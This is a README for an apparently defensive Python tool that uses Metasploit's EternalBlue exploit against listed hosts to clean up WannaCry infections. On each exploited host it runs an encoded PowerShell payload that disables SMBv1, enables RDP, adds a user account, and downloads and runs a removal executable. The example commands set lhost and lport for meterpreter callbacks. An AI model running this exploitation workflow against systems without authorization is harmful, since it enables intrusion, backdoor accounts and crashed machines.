### Wannacry exploitation to remediate tool summary
This tool will leverage Metasploit and the MS17_010_Eternal_Blue exploit to attack the target systems.    
The tool generates an encoded powershell payload based on the set CLI arguments.  
Once the successfully exploitated meterpreter session connects back to the multi handler, the encoded payload is passed to the target.  
The payload then executes in memory.  

### Warning:
    This tool is deisgned as a last resort for remediation of the WannaCry ransomware
    Use at YOUR OWN RISK 
    The metasploit exploit used may crash or destabilize the target systems
    Use only on systems you have permission to exploit
    It is recommended that this tool is used by engineers familiar with metasploit, eternalblue, python, and powershell

### Use Case:
    Systems infected by ransomware that targets SMB vulnerabilities
    Systems vulnerable to SMB vulnerabilities
    Unmanaged systems that have no clear identification of ownership which may be vulenrable or infected

### When Not to Use:
    Systems you do not own or have permission to target
    Production infrastructure: your companies exchange servers, active directory, etc

### Results:
    A json results file will be written to the working directory upon completion
    A log file will be written to the working directory
    A metasploit resource file will be written to the working directory
    A powershell file will be written to the working directory
    A sanatized rhosts file will be written to the working directory
    
### Notes:
    Special characters in the password may need to be escaped ex: asdf\!dsaf\!
    Password must comply with Windows complexity rules
    Username must comply with Windows complexity rules
    Microsoft malicious software removal tool must be downloaded and placed somewhere accessible to your targets
        Download location: https://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx
    Tool only supports the metasploit eternalblue exploit but can be extended as desired

### Command line options:
    Usage:
      wannacry_remediation.py --help
      wannacry_remediation.py [--smb1 --rdp] [(--clean --url=<url>)] [--logon=<message>] [(--username=<username> --password=<password>)] [(--remediate --rhosts=<rhosts> --lhost=<lhost> --lport=<lport>)]
    
    Options:
      --help                    Show help screen
      --smb1                    Add disable SMBv1 to encoded powershell
      --rdp                     Add enable rdp to encoded powershell
      --clean                   Add download and run Microsoft malicious software removal tool during exploit to encoded powershell
      --url=<url>               URL for exploited infected systems to download Microsoft malicious software removal tool
      --username=<username>     Username of user created in encoded powershell
      --password=<password>     Password of user created in encoded powershell
      --logon=<message>         Add enable Windows logon message to encoded powershell
      --remediate               Run metasploit to execute encoded powershell against rhosts
      --rhosts=<rhosts>         Absolute file path for rhosts targets file
      --lhost=<lhost>           Host IP for the metasploit multi handler
      --lport=<lport>           Host port for the metasploit multi handler

### Examples:
    # Run tool to generate a powershell encoded command string written to a ps1 file
    $ sudo python3 wannacry_remediation.py --clean --url=http://simplewebserver/removal.exe --smb1 --rdp --username=Albert --password=einste\!n --logon="contact your infosec team"

    # Run tool to generate a powershell encoded command string
    # Once metasploit gets a meterpreter the powershell will be auto executed against target
    # Exploitation of all targets in rhost will be attempted
    $ sudo python3 wannacry_remediation.py --clean --url=http://simplewebserver/removal.exe --smb1 --rdp --username=Albert --password=einste\!n --logon="contact your infosec team" --remediate --rhosts=rhosts --lhost=SourceIP --lport=SourcePort
